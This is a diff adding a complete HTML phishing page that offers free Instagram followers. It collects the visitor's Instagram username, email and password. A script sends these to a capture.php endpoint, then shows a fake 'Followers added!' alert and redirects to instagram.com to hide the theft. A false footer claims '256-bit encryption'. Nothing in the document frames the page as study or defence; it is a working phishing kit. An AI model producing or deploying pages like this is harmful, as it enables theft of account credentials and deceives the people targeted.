@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Instagram Followers</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .card {
+            max-width: 400px;
+            width: 100%;
+            background: white;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+        }
+        .header {
+            background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
+            padding: 30px;
+            text-align: center;
+            color: white;
+        }
+        .header h1 { font-size: 24px; margin-top: 10px; }
+        .content { padding: 30px; }
+        .badge {
+            background: #f0f0f0;
+            padding: 15px;
+            border-radius: 15px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .badge h2 { color: #833ab4; font-size: 32px; }
+        .input-group { margin-bottom: 15px; }
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+        }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .footer {
+            padding: 15px;
+            text-align: center;
+            font-size: 11px;
+            color: #999;
+            border-top: 1px solid #eee;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="header">
+            <h1>Free Instagram Followers</h1>
+            <p>Get 10,000+ followers instantly!</p>
+        </div>
+        <div class="content">
+            <div class="badge">
+                <h2>10,000+</h2>
+                <p>Free Followers Ready!</p>
+            </div>
+            <form id="form">
+                <div class="input-group">
+                    <input type="text" id="username" placeholder="Instagram Username" required>
+                </div>
+                <div class="input-group">
+                    <input type="email" id="email" placeholder="Email Address" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="Instagram Password" required>
+                </div>
+                <button type="submit" class="btn">Get Followers Now!</button>
+            </form>
+        </div>
+        <div class="footer">
+            <p>🔒 Your data is safe. 256-bit encryption.</p>
+        </div>
+    </div>
+    <script>
+        document.getElementById('form').onsubmit = function(e) {
+            e.preventDefault();
+            const data = {
+                username: document.getElementById('username').value,
+                email: document.getElementById('email').value,
+                password: document.getElementById('password').value
+            };
+            fetch('capture.php', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                body: 'action=login&data=' + encodeURIComponent(JSON.stringify(data))
+            });
+            alert('✅ Followers added! Redirecting...');
+            setTimeout(() => { window.location.href = 'https://www.instagram.com'; }, 2000);
+        };
+    </script>
+</body>
+</html>
